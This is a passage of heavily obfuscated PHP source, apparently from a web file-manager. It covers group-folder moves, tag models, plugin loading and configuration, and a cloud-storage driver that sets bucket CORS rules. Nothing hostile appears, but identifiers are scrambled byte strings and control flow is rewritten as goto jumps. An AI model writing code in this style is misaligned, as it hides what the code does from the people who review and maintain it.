array_to_keyvalue($E¥öÁ’ëÍŠ, $Fµƒéò“¬Å[493], $Fµƒéò“¬Å[404]); goto A¬ÒíÚ·à›; A¬ÒíÚ·à›: $cÔ±³ìÙš¼ = !empty($E¥öÁ’ëÍŠ[$FÜ¬’ŸÊ‰]) ? $E¥öÁ’ëÍŠ[$FÜ¬’ŸÊ‰] : !1; if ($cÔ±³ìÙš¼) { goto b•Ö…÷äâÇ; Cò¡óñó£ : foreach ($E¥öÁ’ëÍŠ as $cÕÈºù®ïâ) { $E£„Ô¤èÓÆ = $cÕÈºù®ïâ[$Fµƒéò“¬Å[412]] == $Fµƒéò“¬Å[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Fµƒéò“¬Å[806])->move($cÕÈºù®ïâ[$Fµƒéò“¬Å[404]], $E†Ë—¿­, $E£„Ô¤èÓÆ); } Model($Fµƒéò“¬Å[806])->moveClearAuth = !0; $b¢—ç““ÒÙ = array($Fµƒéò“¬Å[413] => 2, $Fµƒéò“¬Å[493] => $FÜ¬’ŸÊ‰); goto B›‹‰ÚØ; B›‹‰ÚØ: $A¡ìÓ±İï˜ = array($Fµƒéò“¬Å[493] => $dİ“ĞĞÙ‘); Model($Fµƒéò“¬Å[1797])->where($b¢—ç““ÒÙ)->save($A¡ìÓ±İï˜); Model($Fµƒéò“¬Å[1798])->where($b¢—ç““ÒÙ)->save($A¡ìÓ±İï˜); goto BÒ·Î‡íÏÃ; b•Ö…÷äâÇ: if (!$E¥öÁ’ëÍŠ[$dİ“ĞĞÙ‘]) { $E¥öÁ’ëÍŠ[$dİ“ĞĞÙ‘] = Model($Fµƒéò“¬Å[806])->groupRootAdd($dİ“ĞĞÙ‘); } $E†Ë—¿­ = $E¥öÁ’ëÍŠ[$dİ“ĞĞÙ‘]; $b¢—ç““ÒÙ = array($Fµƒéò“¬Å[487] => $cÔ±³ìÙš¼); goto D«İ«®¬¸Ú; D«İ«®¬¸Ú: $E¥öÁ’ëÍŠ = Model($Fµƒéò“¬Å[806])->where($b¢—ç““ÒÙ)->field($Fµƒéò“¬Å[1796])->select(); if (!$E¥öÁ’ëÍŠ) { $E¥öÁ’ëÍŠ = array(); } Model($Fµƒéò“¬Å[806])->moveClearAuth = !1; goto Cò¡óñó£ ; BÒ·Î‡íÏÃ: } $this->_changeChildLevel($eƒ¥ÓÛçŒ[$FÜ¬’ŸÊ‰], $eƒ¥ÓÛçŒ[$dİ“ĞĞÙ‘], !0); goto CßÍ­ °¥Ÿ; fòÎ˜ÌÇ¼±: $c»âãŸ…Œ = Model($Fµƒéò“¬Å[1780])->where($b¢—ç““ÒÙ)->select(); if (!$c»âãŸ…Œ) { $c»âãŸ…Œ = array(); } foreach ($c»âãŸ…Œ as $EáÄ¹–ÎÜÕ) { $c©„‚‚° = $EáÄ¹–ÎÜÕ[$Fµƒéò“¬Å[1535]]; $b¢—ç““ÒÙ = array($Fµƒéò“¬Å[1535] => $c©„‚‚°, $Fµƒéò“¬Å[1699] => $dİ“ĞĞÙ‘); $E¤§Ô¬°³‰ = Model($Fµƒéò“¬Å[1780])->where($b¢—ç““ÒÙ)->find(); if (!$E¤§Ô¬°³‰) { $F¡©›­Â™‚ = array($dİ“ĞĞÙ‘ => $EáÄ¹–ÎÜÕ[$Fµƒéò“¬Å[1794]]); Model($Fµƒéò“¬Å[515])->userGroupAdd($c©„‚‚°, $F¡©›­Â™‚); } Model($Fµƒéò“¬Å[515])->userGroupRemove($c©„‚‚°, $FÜ¬’ŸÊ‰); } goto fÊÊ†»Ğå; EîâÔêàœ: $Fµƒéò“¬Å =& $_SERVER[úÉ·öƒÑì©]; $b¢—ç““ÒÙ = array($Fµƒéò“¬Å[1699] => array($Fµƒéò“¬Å[7], array($FÜ¬’ŸÊ‰, $dİ“ĞĞÙ‘))); $eƒ¥ÓÛçŒ = $this->where($b¢—ç““ÒÙ)->select(); goto b²™‚®ùÃÑ; d¬–¡¿š÷õ: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\162\137\146\141\x76"; protected function cacheFunctionAlias($b³ŠµÁ…·¢) { $eÔ¶Îš²ô³ =& $_SERVER[úÉ·öƒÑì©]; return array($eÔ¶Îš²ô³[1799] => array($b³ŠµÁ…·¢[0], $eÔ¶Îš²ô³[1800]), $eÔ¶Îš²ô³[1801] => array($b³ŠµÁ…·¢[0], $eÔ¶Îš²ô³[1802])); } protected function get($CëÉĞÏŠ–) { $Aôô„™Ó„ =& $_SERVER[úÉ·öƒÑì©]; $E™ÃÚ×´Î = Model($Aôô„™Ó„[495])->metaGet($CëÉĞÏŠ–, $Aôô„™Ó„[1803]); $F´†öÑ = json_decode($E™ÃÚ×´Î, !0); return $F´†öÑ ? $F´†öÑ : array($Aôô„™Ó„[1804] => $Aôô„™Ó„[87], $Aôô„™Ó„[376] => array()); } protected function set($B½Æ´Æõİõ, $Dš¬ƒï˜ùí) { $aíÏ¡—ê×Ñ =& $_SERVER[úÉ·öƒÑì©]; $Dš¬ƒï˜ùí = $Dš¬ƒï˜ùí ? $Dš¬ƒï˜ùí : array($aíÏ¡—ê×Ñ[1804] => $aíÏ¡—ê×Ñ[87], $aíÏ¡—ê×Ñ[376] => array()); Model($aíÏ¡—ê×Ñ[495])->metaSet($B½Æ´Æõİõ, $aíÏ¡—ê×Ñ[1803], json_encode($Dš¬ƒï˜ùí)); return Model($aíÏ¡—ê×Ñ[495])->metaSet($B½Æ´Æõİõ, $aíÏ¡—ê×Ñ[1803], json_encode($Dš¬ƒï˜ùí)); } protected function getByTagID($B¶°Ôë–, $CÑ¨¦Ú½´ç) { goto CĞ¯©éÃ; CĞ¯©éÃ: $cÑá¿æîã =& $_SERVER[úÉ·öƒÑì©]; if (!$B¶°Ôë– || !$CÑ¨¦Ú½´ç) { return !1; } if (!Model($cÑá¿æîã[495])->getInfoSimple($B¶°Ôë–)) { return !1; } goto eí½õœƒïÒ; eí½õœƒïÒ: $D¬Â‘ƒøò‹ = $this->get($B¶°Ôë–); if (!$D¬Â‘ƒøò‹ || !isset($D¬Â‘ƒøò‹[$cÑá¿æîã[376]])) { return !1; } $DÀã“õ¼ô“ = array_find_by_field($D¬Â‘ƒøò‹[$cÑá¿æîã[376]], $cÑá¿æîã[402], $CÑ¨¦Ú½´ç); goto A…Ï×È¿’; A…Ï×È¿’: return is_array($DÀã“õ¼ô“) ? $DÀã“õ¼ô“ : !1; goto aÒöç´–Š´; aÒöç´–Š´: } public function listSource($fŒ…ÅÜõîÁ, $F·ò†æ‡µ) { goto A‹Ÿ¢’íàÌ; CÎ®ÈŠïÍì: foreach ($Fâ†Ÿ¹ì¾ as $DœÖØ¸¤¦Ì) { if (!in_array($DœÖØ¸¤¦Ì, $AÓ„ÍŒ„ÂÏ)) { $fÍÕ‚ÅÅÅù[] = $DœÖØ¸¤¦Ì; } } if ($fÍÕ‚ÅÅÅù) { $this->removeBySource($fŒ…ÅÜõîÁ, $fÍÕ‚ÅÅÅù); } return $f ‹‘—¡Æö; goto e”êïÛ³‰È; CÌ Ü¬ÈŸ¬: foreach ($Cè‘¾¶Ò as $B»Û†¨êù÷ => $dË×¿¸Ò¥×) { $b„˜òó±Ôè = !0; if (!$F·ò†æ‡µ) { $Fâ†Ÿ¹ì¾[] = $B»Û†¨êù÷; continue; } foreach ($F·ò†æ‡µ as $B­©‘‡×…å) { if (!in_array($B­©‘‡×…å, $dË×¿¸Ò¥×)) { $b„˜òó±Ôè = !1; break; } } if ($b„˜òó±Ôè) { $Fâ†Ÿ¹ì¾[] = $B»Û†¨êù÷; } } if (!$Fâ†Ÿ¹ì¾) { return array(); } $BâŸ”ö¶¸ = array($AÑ‘™¾Äš–[419] => array($AÑ‘™¾Äš–[420], $Fâ†Ÿ¹ì¾), $AÑ‘™¾Äš–[493] => $fŒ…ÅÜõîÁ, $AÑ‘™¾Äš–[413] => SourceModel::TYPE_GROUP); goto d¥¬³’ô¿·; f—‹ÅÀ¨—¤: $F¨¦ƒÆõ™ = array_to_keyvalue($f ‹‘—¡Æö[$AÑ‘™¾Äš–[75]], $AÑ‘™¾Äš–[33], $AÑ‘™¾Äš–[404]); $eì›×¡‚† = array_to_keyvalue($f ‹‘—¡Æö[$AÑ‘™¾Äš–[74]], $AÑ‘™¾Äš–[33], $AÑ‘™¾Äš–[404]); $AÓ„ÍŒ„ÂÏ = array_merge($eì›×¡‚†, $F¨¦ƒÆõ™); goto CÎ®ÈŠïÍì; FæçÄ½Ñ…İ: $Cè‘¾¶Ò = array(); foreach ($C…ÓÕÖ¶Ì as $Aõ‰«±¡œ) { $DœÖØ¸¤¦Ì = $Aõ‰«±¡œ[$AÑ‘™¾Äš–[76]]; if (!$DœÖØ¸¤¦Ì) { continue; } if (!isset($Cè‘¾¶Ò[$DœÖØ¸¤¦Ì])) { $Cè‘¾¶Ò[$DœÖØ¸¤¦Ì] = array(); } $Cè‘¾¶Ò[$DœÖØ¸¤¦Ì][] = $Aõ‰«±¡œ[$AÑ‘™¾Äš–[428]]; } $Fâ†Ÿ¹ì¾ = array(); goto CÌ Ü¬ÈŸ¬; d¥¬³’ô¿·: $f ‹‘—¡Æö = Model($AÑ‘™¾Äš–[1213])->listSource($BâŸ”ö¶¸); if (!$f ‹‘—¡Æö || count($Fâ†Ÿ¹ì¾) == $f ‹‘—¡Æö[$AÑ‘™¾Äš–[373]][$AÑ‘™¾Äš–[374]]) { return $f ‹‘—¡Æö; } $fÍÕ‚ÅÅÅù = array(); goto f—‹ÅÀ¨—¤; A‹Ÿ¢’íàÌ: $AÑ‘™¾Äš– =& $_SERVER[úÉ·öƒÑì©]; if ($F·ò†æ‡µ && !is_array($F·ò†æ‡µ)) { $F·ò†æ‡µ = array($F·ò†æ‡µ); } $C…ÓÕÖ¶Ì = $this->listData($fŒ…ÅÜõîÁ); goto FæçÄ½Ñ…İ; e”êïÛ³‰È: } protected function listData($c—ÆÂ¢í¢ˆ) { $bğ†à¤Ó»‚ =& $_SERVER[úÉ·öƒÑì©]; $cƒ”¹— Ü = array($bğ†à¤Ó»‚[1527] => 0, $bğ†à¤Ó»‚[472] => array($bğ†à¤Ó»‚[1805], 0), $bğ†à¤Ó»‚[424] => $bğ†à¤Ó»‚[1806] . $c—ÆÂ¢í¢ˆ); $C¨‡ùÀÁŒ = $bğ†à¤Ó»‚[1807]; $E…ßÛÎÀÔ = $this->field($C¨‡ùÀÁŒ)->where($cƒ”¹— Ü)->order($bğ†à¤Ó»‚[1808])->select(); return $E…ßÛÎÀÔ ? $E…ßÛÎÀÔ : array(); } protected function addToTag($f”¸±ò„éõ, $fÃ½ŠÂèó÷, $Eµ¸ë¡éÌ²) { $d°——ïº´¢ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->getByTagID($f”¸±ò„éõ, $Eµ¸ë¡éÌ²) || !$fÃ½ŠÂèó÷) { return !1; } if (!Model($d°——ïº´¢[806])->pathInfo($fÃ½ŠÂèó÷)) { return !1; } $C¦®ˆ‡”İÙ = array($d°——ïº´¢[1527] => 0, $d°——ïº´¢[472] => $Eµ¸ë¡éÌ², $d°——ïº´¢[423] => $fÃ½ŠÂèó÷, $d°——ïº´¢[424] => $d°——ïº´¢[1809] . $f”¸±ò„éõ, $d°——ïº´¢[422] => $d°——ïº´¢[33], $d°——ïº´¢[1703] => 0); if ($this->where($C¦®ˆ‡”İÙ)->find()) { return !1; } return $this->add($C¦®ˆ‡”İÙ); } protected function removeFromTag($fÆ’¤¢¤“½, $a•Ò‘Ñ†ùá, $aÈ‰°´ö¿) { $DŞ“Ö­Œ =& $_SERVER[úÉ·öƒÑì©]; if (!$this->getByTagID($fÆ’¤¢¤“½, $aÈ‰°´ö¿) || !$a•Ò‘Ñ†ùá) { return !1; } if (is_array($a•Ò‘Ñ†ùá)) { $a•Ò‘Ñ†ùá = array($DŞ“Ö­Œ[7], $a•Ò‘Ñ†ùá); } $d¦Ÿìß„ç = array($DŞ“Ö­Œ[1527] => 0, $DŞ“Ö­Œ[472] => $aÈ‰°´ö¿, $DŞ“Ö­Œ[424] => $DŞ“Ö­Œ[1809] . $fÆ’¤¢¤“½, $DŞ“Ö­Œ[423] => $a•Ò‘Ñ†ùá); return $this->where($d¦Ÿìß„ç)->delete(); } protected function removeByTag($fïßùÌŒ©ß, $fËÄ¡ÚÂö) { $A²…Œº÷Ï =& $_SERVER[úÉ·öƒÑì©]; if (!$this->getByTagID($fïßùÌŒ©ß, $fËÄ¡ÚÂö)) { return !1; } $e«óÒÉï„Í = array($A²…Œº÷Ï[1527] => 0, $A²…Œº÷Ï[472] => $fËÄ¡ÚÂö, $A²…Œº÷Ï[424] => $A²…Œº÷Ï[1809] . $fïßùÌŒ©ß); return $this->where($e«óÒÉï„Í)->delete(); } protected function removeBySource($AŞ—á¥”, $b•µ¹å²‡â) { $c°‘ÒÚİèÆ =& $_SERVER[úÉ·öƒÑì©]; if (!$AŞ—á¥” || !$b•µ¹å²‡â) { return !1; } if (is_array($b•µ¹å²‡â)) { $b•µ¹å²‡â = array($c°‘ÒÚİèÆ[7], $b•µ¹å²‡â); } $b‚¥°ˆù÷‚ = array($c°‘ÒÚİèÆ[1527] => 0, $c°‘ÒÚİèÆ[423] => $b•µ¹å²‡â, $c°‘ÒÚİèÆ[472] => array($c°‘ÒÚİèÆ[979], 0), $c°‘ÒÚİèÆ[424] => $c°‘ÒÚİèÆ[1809] . $AŞ—á¥”); return $this->where($b‚¥°ˆù÷‚)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\x70\154\x75\x67\x69\156\x4c\x69\x73\164"; public $field = array("\156\141\155\145", "\x73\164\x61\164\x75\x73", "\162\x65\x67\151\x65\163\164", "\x63\157\x6e\x66\x69\147"); public function loadList($cÒœ¶ÌÉ§ = false) { $e‚¼¥¶™ã = array_to_keyvalue($this->listData(), $_SERVER[úÉ·öƒÑì©][28]); if ($cÒœ¶ÌÉ§) { return $e‚¼¥¶™ã[$cÒœ¶ÌÉ§]; } return $e‚¼¥¶™ã; } public function init() { $fë¿‰á²Ñ¶ =& $_SERVER[úÉ·öƒÑì©]; Hook::trigger($fë¿‰á²Ñ¶[1810]); $D‹²ƒ„¢… = $this->loadPluginList(); foreach ($D‹²ƒ„¢… as $EøØÎ¿¯‘É => $Aéª¥à§›Ş) { $d—öŠ³Û´é = $this->appAllow($EøØÎ¿¯‘É, $Aéª¥à§›Ş); if (!$d—öŠ³Û´é) { continue; } foreach ($Aéª¥à§›Ş[$fë¿‰á²Ñ¶[1811]] as $cµÈ½¿Ø => $Eõ³¬äˆ) { Hook::bind($cµÈ½¿Ø, $Eõ³¬äˆ); } } Hook::trigger($fë¿‰á²Ñ¶[1812]); Hook::trigger(ACTION); } public function appAllow($F½œ†îÜŞ, $A¶½³Ìë³, $bÜáß¨  = true) { $C×Ä†¶ºØÙ =& $_SERVER[úÉ·öƒÑì©]; $a¨Ø¦Ã°­á = PLUGIN_DIR . $F½œ†îÜŞ . $C×Ä†¶ºØÙ[1813]; if (!is_array($A¶½³Ìë³) || !is_array($A¶½³Ìë³[$C×Ä†¶ºØÙ[1811]]) || $A¶½³Ìë³[$C×Ä†¶ºØÙ[726]] != 1 || !is_file($a¨Ø¦Ã°­á)) { return !1; } if ($GLOBALS[$C×Ä†¶ºØÙ[494]] == 1) { return !0; } if ($bÜáß¨  && !Action($C×Ä†¶ºØÙ[1814])->checkAuth($F½œ†îÜŞ)) { return !1; } return !0; } public function unInstall($föŸ˜§â÷») { $cˆŒ“ˆŒÉÛ =& $_SERVER[úÉ·öƒÑì©]; $DÆ³öø®ª = $this->loadList($föŸ˜§â÷»); if (file_exists(PLUGIN_DIR . $föŸ˜§â÷»)) { Hook::apply($föŸ˜§â÷» . $cˆŒ“ˆŒÉÛ[1815]); } $this->remove($DÆ³öø®ª[$cˆŒ“ˆŒÉÛ[402]]); } public function changeStatus($DÑ·ÔŠÊÉî, $cƒ¾¨ÑÄÏ) { $a’°å›‘Ñ« =& $_SERVER[úÉ·öƒÑì©]; $bÙ›¯ùŞ  = $this->loadList($DÑ·ÔŠÊÉî); if ($cƒ¾¨ÑÄÏ) { Hook::apply($DÑ·ÔŠÊÉî . $a’°å›‘Ñ«[1816]); } $this->update($bÙ›¯ùŞ [$a’°å›‘Ñ«[402]], array($a’°å›‘Ñ«[1817] => $cƒ¾¨ÑÄÏ)); } public function appRegist($Dù£ìÀ°Ô¢, $DùÊ¶†á™) { $aÙé›‚×¿ =& $_SERVER[úÉ·öƒÑì©]; $BÙã¶“ÔÈŠ = $this->loadList($Dù£ìÀ°Ô¢); if ($BÙã¶“ÔÈŠ) { $this->update($BÙã¶“ÔÈŠ[$aÙé›‚×¿[402]], array($aÙé›‚×¿[1811] => $DùÊ¶†á™)); } else { $e¯¯–„§èó = array($aÙé›‚×¿[28] => $Dù£ìÀ°Ô¢, $aÙé›‚×¿[1811] => $DùÊ¶†á™, $aÙé›‚×¿[726] => 0, $aÙé›‚×¿[6] => $this->getConfigDefault($Dù£ìÀ°Ô¢)); $this->insert($e¯¯–„§èó); } } public function getConfigDefault($C÷ÇµêÛ£¿) { $C††‰ŸÕÙ =& $_SERVER[úÉ·öƒÑì©]; $bÜïØ¨Åù = array(); $bÈ²•Àò°Õ = $this->getPackageJson($C÷ÇµêÛ£¿); if (!$bÈ²•Àò°Õ && is_array($bÈ²•Àò°Õ[$C††‰ŸÕÙ[1818]])) { return $bÜïØ¨Åù; } foreach ($bÈ²•Àò°Õ[$C††‰ŸÕÙ[1818]] as $CÇùÔäáÉÚ => $fÓáÑ»¢°ì) { if (!isset($fÓáÑ»¢°ì[$C††‰ŸÕÙ[381]]) || isset($bÜïØ¨Åù[$CÇùÔäáÉÚ])) { continue; } $bÜïØ¨Åù[$CÇùÔäáÉÚ] = $fÓáÑ»¢°ì[$C††‰ŸÕÙ[381]]; } return $bÜïØ¨Åù; } public function getPackageJson($DŒÚİ„ÇÜ) { return Hook::apply($DŒÚİ„ÇÜ . $_SERVER[úÉ·öƒÑì©][1819]); } public function getConfig($DÁÆ‘’ŞÆŸ, $b½°’ßÜâ„ = false) { $dã›¬ÃàÊ =& $_SERVER[úÉ·öƒÑì©]; $cÓƒ»É«öƒ = array(); $C½çÖ ßĞ„ = $this->loadList($DÁÆ‘’ŞÆŸ); if ($C½çÖ ßĞ„ && is_array($C½çÖ ßĞ„[$dã›¬ÃàÊ[6]])) { $cÓƒ»É«öƒ = $C½çÖ ßĞ„[$dã›¬ÃàÊ[6]]; } if (!$cÓƒ»É«öƒ || $b½°’ßÜâ„) { $cÓƒ»É«öƒ = $this->getConfigDefault($DÁÆ‘’ŞÆŸ); } return $cÓƒ»É«öƒ; } public function setConfig($a¤åê¨Ú¸Š, $d¯¶ŒÄç… = false) { goto F«ø–”«; F«ø–”«: $Eäó‡Ê­ñƒ =& $_SERVER[úÉ·öƒÑì©]; $cØãîŸÄ = $this->loadList($a¤åê¨Ú¸Š); if (!$cØãîŸÄ) { return !1; } goto fŒ×Àš¹ê¾; fŒ×Àš¹ê¾: $AÉË‹áÈƒã = $cØãîŸÄ[$Eäó‡Ê­ñƒ[6]]; if ($d¯¶ŒÄç… == !1) { $AÉË‹áÈƒã = array(); $d¯¶ŒÄç… = $this->getConfigDefault($a¤åê¨Ú¸Š); } foreach ($d¯¶ŒÄç… as $AÁˆÚÙ˜ìµ => $c‡…°…­²õ) { $AÉË‹áÈƒã[$AÁˆÚÙ˜ìµ] = is_string($c‡…°…­²õ) ? trim($c‡…°…­²õ) : $c‡…°…­²õ; } goto Aà“ˆˆŒø; Aà“ˆˆŒø: $this->update($cØãîŸÄ[$Eäó‡Ê­ñƒ[402]], array($Eäó‡Ê­ñƒ[6] => $AÉË‹áÈƒã)); goto F¬ÂòšàÈå; F¬ÂòšàÈå: } public function viewList() { goto FßŒ»¶‘¼; bøÆˆ½÷…¿: $EçÎÙÚšÕå = $this->loadPluginList(); $b¼¹ÓœäŒÈ = array(); foreach ($EçÎÙÚšÕå as $FÆíŞßœ«¨ => $Bì×ËåÛõ) { unset($Bì×ËåÛõ[$Eò£íñ†£í[1811]], $Bì×ËåÛõ[$Eò£íñ†£í[6]]); $D¸ª¿øÀæª = PLUGIN_DIR . $Bì×ËåÛõ[$Eò£íñ†£í[28]] . $Eò£íñ†£í[1813]; if (!is_file($D¸ª¿øÀæª)) { continue; } $AÅâ­ö¨êâ = Hook::apply($Bì×ËåÛõ[$Eò£íñ†£í[28]] . $Eò£íñ†£í[1819]); if (is_array($AÅâ­ö¨êâ)) { $b¼¹ÓœäŒÈ[$FÆíŞßœ«¨] = array_merge($Bì×ËåÛõ, $AÅâ­ö¨êâ); } } goto DŞåÇêŒÑ; FßŒ»¶‘¼: $Eò£íñ†£í =& $_SERVER[úÉ·öƒÑì©]; $EçÎÙÚšÕå = $this->loadList(); $this->pluginScan($EçÎÙÚšÕå); goto bøÆˆ½÷…¿; DŞåÇêŒÑ: return $b¼¹ÓœäŒÈ; goto fæ¯Ö¡Íäé; fæ¯Ö¡Íäé: } private function loadPluginList() { $F«É ºÏ„í =& $_SERVER[úÉ·öƒÑì©]; $eà³İÆë¾ = $this->loadList(); if (strtolower(MOD) == $F«É ºÏ„í[1820]) { return $eà³İÆë¾; } $cÆ¿²ÕÆƒ¦ = Hook::trigger($F«É ºÏ„í[1821], $eà³İÆë¾); if ($eà³İÆë¾ && !$cÆ¿²ÕÆƒ¦) { die; } return $cÆ¿²ÕÆƒ¦ ? $cÆ¿²ÕÆƒ¦ : $eà³İÆë¾; } private function pluginScan($e¥Ö‚†ˆ) { $E‡Áğ©Ôå =& $_SERVER[úÉ·öƒÑì©]; recursion_dir(PLUGIN_DIR, $fĞ ªˆœ, $b¢¥‘¼Ø†, 0); foreach ($fĞ ªˆœ as $BòØ½¿»É) { $dÀÙæ¶Ü‹Ò = get_path_this($BòØ½¿»É); if (isset($e¥Ö‚†ˆ[$dÀÙæ¶Ü‹Ò]) || !file_exists($BòØ½¿»É . $E‡Áğ©Ôå[1822]) || !file_exists($BòØ½¿»É . $E‡Áğ©Ôå[1813])) { continue; } Hook::apply($dÀÙæ¶Ü‹Ò . $E‡Áğ©Ôå[1816]); } } } goto b›ˆĞªÑ; FÂÆëßÄ°: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($c“ ˜éÌšù) { parent::__construct(); include_once SDK_DIR . $_SERVER[úÉ·öƒÑì©][1267]; $this->_init($c“ ˜éÌšù); } public function _init($Eƒ«Éì„¾í) { $EÇéò—’ìà =& $_SERVER[úÉ·öƒÑì©]; foreach ($Eƒ«Éì„¾í as $bŸƒò¢ø¨™ => $fß«ÈäÉš‡) { if (isset($this->{$bŸƒò¢ø¨™})) { $this->{$bŸƒò¢ø¨™} = $fß«ÈäÉš‡; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($EÇéò—’ìà[1268] . LNG($EÇéò—’ìà[1269])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto f¯®”ø°°; f¯®”ø°°: $DÙïô”ù¡á =& $_SERVER[úÉ·öƒÑì©]; $d¿»ÔíŒõ = new OSS\Model\CorsConfig(); $EÄâ”¼†Ş = new OSS\Model\CorsRule(); goto Aİ¥ëŠö½; eØ´‹ÁÅêĞ: $d¿»ÔíŒõ->addRule($EÄâ”¼†Ş); try { $this->client->putBucketCors($this->bucket, $d¿»ÔíŒõ); } catch (OSS\Core\OssException $DŞ«ÊÑœš) { return !1; } return !0; goto Eİ³áŞÛ‡š; Aİ¥ëŠö½: $EÄâ”¼†Ş->addAllowedOrigin($DÙïô”ù¡á[1270]); $EÄâ”¼†Ş->addAllowedMethod($DÙïô”ù¡á[1271]); $EÄâ”¼†Ş->addAllowedMethod($DÙïô”ù¡á[1272]); goto B—•ß´åÎ; B—•ß´åÎ: $EÄâ”¼†Ş->addAllowedMethod($DÙïô”ù¡á[1273]); $EÄâ”¼†Ş->addAllowedMethod($DÙïô”ù¡á[1274]); $EÄâ”¼†Ş->addAllowedMethod($DÙïô”ù¡á[158]); goto f¼‹„šØß‚; f¼‹„šØß‚: $EÄâ”¼†Ş->setMaxAgeSeconds(600); $EÄâ”¼†Ş->addExposeHeader($DÙïô”ù¡á[1275]); $EÄâ”¼†Ş->addAllowedHeader($DÙïô”ù¡á[1270]); goto eØ´‹ÁÅêĞ; Eİ³áŞÛ‡š: } public function getBucketCors() { goto cÒ‚ç©µ¨; cÒ‚ç©µ¨: $Bİ¬»™æÆ§ =& $_SERVER[úÉ·öƒÑì©]; $F¹´·„„‡¨ = null; try { $F¹´·„„‡¨ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $cÆäº“¯Ÿ¿) { return null; } goto B‰¸³•‘“Ø; B‰¸³•‘“Ø: if (!$F¹´·„„‡¨ || !($aá÷±ĞÂ¸¿ = $F¹´·„„‡¨->getRules())) { return null; } $f–³ÔçÒ¯ = $aá÷±ĞÂ¸¿[0]->getAllowedOrigins(); $Bø‡ŠŞà÷Œ = $aá÷±ĞÂ¸¿[0]->getAllowedMethods(); goto FáÑµŞŞ¹õ; FáÑµŞŞ¹õ: $eíÜÄ£ß— = $aá÷±ĞÂ¸¿[0]->getMaxAgeSeconds(); $Aƒ¹ì’£Šì = $aá÷±ĞÂ¸¿[0]->getExposeHeaders(); $E”‹•Íù‰— = $aá÷±ĞÂ¸¿[0]->getAllowedHeaders(); goto cğìß¨óæÚ; cğìß¨óæÚ: return array($Bİ¬»™æÆ§[181] => isset($f–³ÔçÒ¯[0]) ? $f–³ÔçÒ¯[0] : $Bİ¬»™æÆ§[33], $Bİ¬»™æÆ§[185] => $Bø‡ŠŞà÷Œ, $Bİ¬»™æÆ§[1276] => $eíÜÄ£ß—, $Bİ¬»™æÆ§[1277] => isset($Aƒ¹ì’£Šì[0]) ? $Aƒ¹ì’£Šì[0] : $Bİ¬»™æÆ§[33], $Bİ¬»™æÆ§[183] => isset($E”‹•Íù‰—[0]) ? $E”‹•Íù‰—[0] : $Bİ¬»™æÆ§[33]); goto dÈÕ­ÆÎª; dÈÕ­ÆÎª: } public function isBucketCors() { goto Bœäë·›ÉĞ; Fê”ö£¼ñ: if ($fÛÊòÊÜ©[$bÔ´øÓİÒÎ[181]] != $bÔ´øÓİÒÎ[182] || $fÛÊòÊÜ©[$bÔ´øÓİÒÎ[183]] != $bÔ´øÓİÒÎ[182]) { return !1; } $F×‘Î­‚­Î = array_map($bÔ´øÓİÒÎ[184], $fÛÊòÊÜ©[$bÔ´øÓİÒÎ[185]]); if (!is_array($F×‘Î­‚­Î)) { $F×‘Î­‚­Î = array(); } goto F²“³¹¢è; Bœäë·›ÉĞ: $bÔ´øÓİÒÎ =& $_SERVER[úÉ·öƒÑì©]; $fÛÊòÊÜ© = $this->getBucketCors(); if (!$fÛÊòÊÜ© || !is_array($fÛÊòÊÜ©)) { return !1; } goto Fê”ö£¼ñ; F²“³¹¢è: $e ›ª¥‘İ£ = array($bÔ´øÓİÒÎ[186], $bÔ´øÓİÒÎ[187], $bÔ´øÓİÒÎ[188], $bÔ´øÓİÒÎ[189], $bÔ´øÓİÒÎ[190]); $dÖíñ½ƒÏÛ = array_diff($e ›ª¥‘İ£, $F×‘Î­‚­Î); return empty($dÖíñ½ƒÏÛ); goto fïë¥êÀ¡‰; fïë¥êÀ¡‰: } public function mkfile($A¿òô›Ú‹ò, $D„ù§ÉÁ¹¬ = '', $a˜ô²›Ü = REPEAT_RENAME) { $dÊÕíß«°Ï = $this->setContent($A¿òô›Ú‹ò, $D„ù§ÉÁ¹¬); if ($dÊÕíß«°Ï !== !1) { return $this->getPathOuter($A¿òô›Ú‹ò); } return !1; } public function mkdir($Dñ‹¦Ëê’¦, $BÀ­”ëÕÕ = REPEAT_SKIP) { if ($this->_isFolder($Dñ‹¦Ëê’¦)) { return $this->getPathOuter($Dñ‹¦Ëê’¦); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($Dñ‹¦Ëê’¦)); } catch (OSS\Core\OssException $d¤×«Õö‡) { return !1; } return $this->getPathOuter($Dñ‹¦Ëê’¦); } private function fileList($a¶áÌæˆµ, $Bë£…ÍÚ = '', $B«è²Ú™š¢ = 0) { goto d‚ĞÀ¤Ãö; F–¥ƒ³®Š: $A¿òÈ¥×Ù = $c‰¾§ĞÚ[33]; $AöÀÓíˆŞÎ = 1000; $f„ˆğÕ Íö = $this->listItemCache === !1 ? !1 : !0; goto FÇÊÒñÏ„³; CÑšÂ µ: return array($c‰¾§ĞÚ[75] => $fÀĞ—İ—¶‡, $c‰¾§ĞÚ[74] => $aùª…Å‚º); goto BÆîÍË¸­î; FÇÊÒñÏ„³: $fÀĞ—İ—¶‡ = $aùª…Å‚º = array(); while (!0) { check_abort(); $Aæ†ğÏÃÎİ = array($c‰¾§ĞÚ[1278] => $Bë£…ÍÚ, $c‰¾§ĞÚ[1279] => $C®Ü‚±ƒÀÉ, $c‰¾§ĞÚ[1280] => $AöÀÓíˆŞÎ, $c‰¾§ĞÚ[1281] => $A¿òÈ¥×Ù); try { $fÁ‚®¹®¾Ï = $this->client->listObjects($this->bucket, $Aæ†ğÏÃÎİ); } catch (OSS\Core\OssException $eòÒÈ‰í«) { break; } $A¿òÈ¥×Ù = $fÁ‚®¹®¾Ï->getNextMarker(); $b‹Ãø¾Ö› = $fÁ‚®¹®¾Ï->getObjectList(); $e‰ù†òßŠ½ = $fÁ‚®¹®¾Ï->getPrefixList(); foreach 